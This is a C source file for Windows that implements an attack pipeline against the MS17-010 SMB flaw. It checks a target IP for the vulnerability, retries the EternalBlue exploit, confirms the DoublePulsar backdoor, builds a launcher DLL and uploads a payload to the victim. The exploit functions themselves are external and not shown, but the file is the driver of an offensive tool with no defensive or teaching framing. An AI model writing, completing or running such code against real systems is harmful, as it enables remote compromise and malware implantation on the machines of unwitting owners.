#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include "config.h"

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *binary_path, const char *dll_out_path);
extern int upload_payload(const char *ip, int port, const char *payload_path, int payload_type);

int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int status;
    int attempt;
    int eternalblue_succeeded = 0;
    int doublepulsar_active = 0;

    (void)payload_path;

    printf("Checking MS17-010 vulnerability...\n");
    status = ms17_vuln_status(ip, port);
    if (status <= 0) {
        printf("Target is not vulnerable.\n");
        return -1;
    }

    for (attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        printf("EternalBlue attempt %d of %d...\n", attempt + 1, MAX_RETRIES);
        status = EternalBlue(ip, port);
        if (status != 0) {
            printf("EternalBlue attempt %d failed.\n", attempt + 1);
            continue;
        }

        eternalblue_succeeded = 1;
        printf("Checking for DoublePulsar...\n");
        status = doublepulsar_check(ip, port);
        if (status > 0) {
            doublepulsar_active = 1;
            printf("DoublePulsar is active.\n");
            break;
        }

        printf("DoublePulsar is not active; retrying if attempts remain.\n");
    }

    if (!doublepulsar_active) {
        printf("DoublePulsar was not detected.\n");
        return eternalblue_succeeded ? -3 : -2;
    }

    printf("Building launcher DLL...\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) != 0) {
        printf("Failed to build launcher DLL.\n");
        return -4;
    }

    printf("Uploading payload...\n");
    if (upload_payload(ip, port, PAYLOAD_DLL_PATH, 1) != 0) {
        printf("Failed to upload payload.\n");
        return -5;
    }

    printf("EternalBlue pipeline completed successfully.\n");
    return 0;
}